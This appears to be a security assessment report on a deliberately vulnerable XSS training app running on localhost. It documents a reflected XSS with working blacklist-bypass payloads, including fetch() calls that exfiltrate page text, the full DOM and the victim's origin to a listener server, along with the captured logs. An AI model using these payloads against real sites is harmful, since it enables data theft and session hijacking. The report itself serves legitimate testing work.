# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:34073
- **Assessment Date:** October 24, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

### Authentication Vulnerabilities:
No authentication vulnerabilities were found. The application intentionally implements no authentication system - all endpoints are accessible anonymously by design as this is a deliberately vulnerable XSS training application.

### Authorization Vulnerabilities:
No authorization vulnerabilities were found. The application has no authorization system by design - all users have identical anonymous access to all endpoints.

### Cross-Site Scripting (XSS) Vulnerabilities:
**One HIGH severity vulnerability was successfully exploited:** A reflected XSS vulnerability exists in the `/page` endpoint's `name` parameter. The vulnerability bypasses the blacklist filter using HTML entity encoding (`&#40;` and `&#41;` for parentheses), allowing arbitrary JavaScript execution. This enables complete DOM access, data exfiltration, unauthorized HTTP requests from the victim's browser context, and cross-origin data theft. The application explicitly disables XSS protections (`X-XSS-Protection: 0`) and has no Content Security Policy, making exploitation straightforward once the blacklist is bypassed.

### SQL/Command Injection Vulnerabilities:
No SQL or command injection vulnerabilities were found. The application has no database operations (eliminating SQL injection vectors) and uses safe subprocess execution patterns with array-based arguments and no shell interpretation (eliminating command injection vectors).

### Server-Side Request Forgery (SSRF) Vulnerabilities:
No SSRF vulnerabilities were found. While the application uses PhantomJS for server-side validation, it only accesses localhost resources with application-controlled URLs, providing no SSRF exploitation opportunities.

## Network Reconnaissance

### Open Ports & Services
- **Port 80/tcp:** Caddy httpd (reverse proxy to the application)
- **Port 443/tcp:** SSL/HTTPS (Caddy with TLS)
- **Port 34073/tcp:** Flask application endpoint (Werkzeug 1.0.1 development server)

**Non-application services detected (not part of security scope):**
- Port 631/tcp: CUPS 2.3 print service
- Port 8888/tcp: SimpleHTTPServer (Python 3.12.10)
- Port 49158/tcp: Tailscale VPN service

### Technology Stack Findings
- **Backend:** Python 2.7.18 (End-of-Life since January 2020 - no security patches)
- **Web Server:** Werkzeug 1.0.1 development server (not production-ready)
- **Framework:** Flask 1.1.4 (contains known CVEs including CVE-2023-30861)
- **Validation Engine:** PhantomJS (deprecated since 2018, contains unpatched vulnerabilities)

### Security Misconfigurations Detected
- **Debug Mode Enabled:** Flask running with `debug=True` exposes Werkzeug interactive debugger
- **Development Server in Use:** Werkzeug development server binding to all interfaces (0.0.0.0:5000)
- **Explicitly Disabled XSS Protection:** `X-XSS-Protection: 0` header disables browser-based XSS filtering
- **No Content Security Policy:** No CSP headers detected, allowing unrestricted script execution
- **Plaintext Secret Storage:** Application loads sensitive flags from unencrypted filesystem

### Subdomain Discovery
Multiple localhost subdomains discovered through subfinder scan, though not directly relevant to the containerized deployment:
- server2.hunter.localhost, tools.sonoma.edu.localhost, exchvm.nwcnet.localhost, mse-ca-mail.corp.mse.localhost, autodiscover.regency.localhost, mail.regency.localhost, owa.regency.localhost, naeu2.naeuinc.localhost, mail.localhost, mail02.regency.localhost, mail03.regency.localhost, www.localhost, server02.counterintel.localhost, fndlync01.5ninesdata.localhost, autodiscover.localhost, sbs.allsaintsschool.localhost

---

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS via HTML Entity Bypass in /page Endpoint

**Summary:**
- **Vulnerable location:** `http://localhost:34073/page?name=<payload>`
- **Overview:** Reflected XSS vulnerability in the `name` query parameter that bypasses blacklist filtering using HTML entity encoding (`&#40;` and `&#41;` for parentheses). The vulnerability allows arbitrary JavaScript execution, enabling complete DOM access, data exfiltration, and unauthorized actions on behalf of the victim.
- **Impact:** Complete compromise of victim browser session - arbitrary JavaScript execution allows an attacker to steal sensitive data from the DOM, exfiltrate complete page content, make unauthorized requests with the victim's origin, and potentially conduct phishing attacks. While no session cookies exist in this application, the same technique would enable session hijacking in applications with authentication.
- **Severity:** HIGH

**Prerequisites:**
None - This vulnerability requires no authentication or special privileges. Any unauthenticated user can exploit it.

**Exploitation Steps:**

**Step 1: Confirm JavaScript Execution**

Navigate to the vulnerable URL with a basic XSS payload that uses HTML entity encoding to bypass the blacklist filter:

```
http://localhost:34073/page?name=%22%20onerror%3Dalert%26%2340%3B1%26%2341%3B
```

**Decoded payload:** `" onerror=alert&#40;1&#41;`

**What happens:**
- The payload breaks out of the `<input>` tag's `src` attribute using the leading `"`
- Injects an `onerror` event handler with HTML entity-encoded parentheses
- The browser decodes `&#40;` → `(` and `&#41;` → `)` AFTER the blacklist validation
- The image fails to load (empty src), triggering `onerror` and executing `alert(1)`
- PhantomJS detection confirms execution with error: "Oops! You did an alert with TypeError..."

**Evidence:** Screenshot saved as `workspace/xss_exploitation_proof.png` showing the PhantomJS alert detection message.

**Step 2: Exfiltrate Page Content (Demonstrate Information Disclosure)**

Set up an exfiltration listener on port 8080 (or use an attacker-controlled server):

```bash
node xss-listener.js > xss-listener-console.log 2>&1 &
```

Execute data exfiltration payload to steal page content:

```
http://localhost:34073/page?name=%22%20onerror%3D%22fetch%26%2340%3B%27http%3A%2F%2Flocalhost%3A8080%2Fexfil%3Fdata%3D%27%2Bdocument.body.innerText.substring%26%2340%3B0%2C200%26%2341%3B%26%2341%3B%22
```

**Decoded payload:** `" onerror="fetch&#40;'http://localhost:8080/exfil?data='+document.body.innerText.substring&#40;0,200&#41;&#41;"`

**What happens:**
- XSS executes and calls `fetch()` to exfiltrate page text content
- First 200 characters of visible page text sent to attacker server
- Cross-origin request successfully sent from victim's browser

**Proof of Impact:**
Exfiltration listener log shows successful data theft:
```
[2025-10-24T20:48:18.128Z] Method: GET
[2025-10-24T20:48:18.128Z] URL: /exfil?data=Oops!%20You%20did%20an%20alert...
[2025-10-24T20:48:18.128Z] Query Parameters:
[2025-10-24T20:48:18.128Z]   data: Oops! You did an alert with TypeError: Attempting to change the setter of an unconfigurable property. instead of "XSS"
[2025-10-24T20:48:18.128Z] Headers:
[2025-10-24T20:48:18.128Z]   origin: http://localhost:34073
[2025-10-24T20:48:18.128Z]   user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36...
```

**Step 3: Exfiltrate Complete DOM (Advanced Information Disclosure)**

Execute comprehensive DOM exfiltration payload:

```
http://localhost:34073/page?name=%22%20onerror%3D%22fetch%26%2340%3B%27http%3A%2F%2Flocalhost%3A8080%2Fsteal%3Furl%3D%27%2BencodeURIComponent%26%2340%3Blocation.href%26%2341%3B%2B%27%26html%3D%27%2BencodeURIComponent%26%2340%3Bdocument.documentElement.innerHTML%26%2341%3B%26%2341%3B%22
```

**Decoded payload:** `" onerror="fetch&#40;'http://localhost:8080/steal?url='+encodeURIComponent&#40;location.href&#41;+'&html='+encodeURIComponent&#40;document.documentElement.innerHTML&#41;&#41;"`

**What happens:**
- XSS executes and exfiltrates both the current URL and complete HTML source
- Attacker receives full DOM tree including all page structure and content
- This demonstrates complete page compromise

**Proof of Impact:**
Exfiltration listener captured complete DOM:
```
[2025-10-24T20:48:34.904Z] Method: GET
[2025-10-24T20:48:34.904Z] URL: /steal?url=http%3A%2F%2Flocalhost%3A34073%2Fpage%3Fname%3D...&html=...
[2025-10-24T20:48:34.904Z] Query Parameters:
[2025-10-24T20:48:34.904Z]   url: http://localhost:34073/page?name=...
[2025-10-24T20:48:34.904Z]   html: <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss20.css">
            <title>Dalgona - Star</title>
        </head>
        <body><article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    ...
```

**Step 4: Demonstrate Unauthorized Actions**

Execute payload that makes requests on behalf of the victim:

```
http://localhost:34073/page?name=%22%20onerror%3D%22fetch%26%2340%3B%27http%3A%2F%2Flocalhost%3A8080%2Faction%3Ftype%3Dunauth_request%26victim_origin%3D%27%2Blocation.origin%2B%27%26victim_url%3D%27%2Blocation.href%26%2341%3B%22
```

**Decoded payload:** `" onerror="fetch&#40;'http://localhost:8080/action?type=unauth_request&victim_origin='+location.origin+'&victim_url='+location.href&#41;"`

**What happens:**
- XSS executes arbitrary JavaScript code
- Makes unauthorized HTTP request with victim's browser context
- Sends victim's origin and current URL to attacker server
- Demonstrates ability to perform CSRF-style attacks via XSS

**Proof of Impact:**
Exfiltration listener shows unauthorized request:
```
[2025-10-24T20:49:38.140Z] Method: GET
[2025-10-24T20:49:38.140Z] Path: /action
[2025-10-24T20:49:38.140Z] Query Parameters:
[2025-10-24T20:49:38.140Z]   type: unauth_request
[2025-10-24T20:49:38.140Z]   victim_origin: http://localhost:34073
[2025-10-24T20:49:38.140Z]   victim_url: http://localhost:34073/page?name=" onerror="fetch&#40;'http://localhost:8080/action?type=unauth_request&victim_origin='+location.origin+'&victim_url='+location.href&#41;"
[2025-10-24T20:49:38.140Z] Headers:
[2025-10-24T20:49:38.140Z]   origin: http://localhost:34073
```

**Proof of Impact:**

1. **JavaScript Execution Confirmed:** PhantomJS detection system triggered, displaying error message confirming `alert()` execution
2. **Information Disclosure:** Successfully exfiltrated page text content to attacker-controlled server with victim's browser fingerprint
3. **Complete DOM Exfiltration:** Captured entire HTML source code including all page structure, styles, and content
4. **Unauthorized Actions:** Demonstrated ability to make arbitrary HTTP requests from victim's browser context with their origin
5. **Cross-Origin Data Theft:** All requests originated from `http://localhost:34073` and successfully reached attacker server

**Attack Impact Summary:**
- ✅ Arbitrary JavaScript execution confirmed
- ✅ Page content exfiltration demonstrated
- ✅ Complete DOM extraction achieved
- ✅ Unauthorized HTTP requests executed
- ✅ Browser fingerprinting captured (User-Agent, platform, etc.)
- ✅ Cross-origin data theft proven

**Notes:**

**Blacklist Bypass Technique:**
The application implements a blacklist filter checking for `<`, `>`, `(`, `)`, `throw`, `` ` ``, `´`, and `javascript`. The bypass works because:
1. Blacklist validation checks the literal string BEFORE the browser renders it
2. HTML entities (`&#40;` and `&#41;`) pass the blacklist validation
3. Browser decodes HTML entities AFTER validation but BEFORE JavaScript execution
4. This timing discrepancy allows complete bypass of the security control

**Real-World Impact:**
While this test application has no authentication system, the same vulnerability in a production application would enable:
- Session cookie theft (if cookies lack HttpOnly flag)
- JWT token exfiltration from localStorage/sessionStorage
- Credential harvesting via injected phishing forms
- Account takeover through unauthorized actions
- Keylogging and form hijacking
- Malware distribution through trusted domain

**Defense Evasion:**
- X-XSS-Protection explicitly disabled (`0`) - no browser-based XSS filtering
- No Content Security Policy (CSP) - no restrictions on script execution
- No output encoding applied to user input
- HTML entity decoding happens after blacklist validation

**Reproducibility:**
All steps are 100% reproducible. Simply navigate to the provided URLs in any modern browser. The exfiltration listener can be any HTTP server capable of logging requests (netcat, Python HTTP server, Node.js server, Burp Collaborator, etc.).
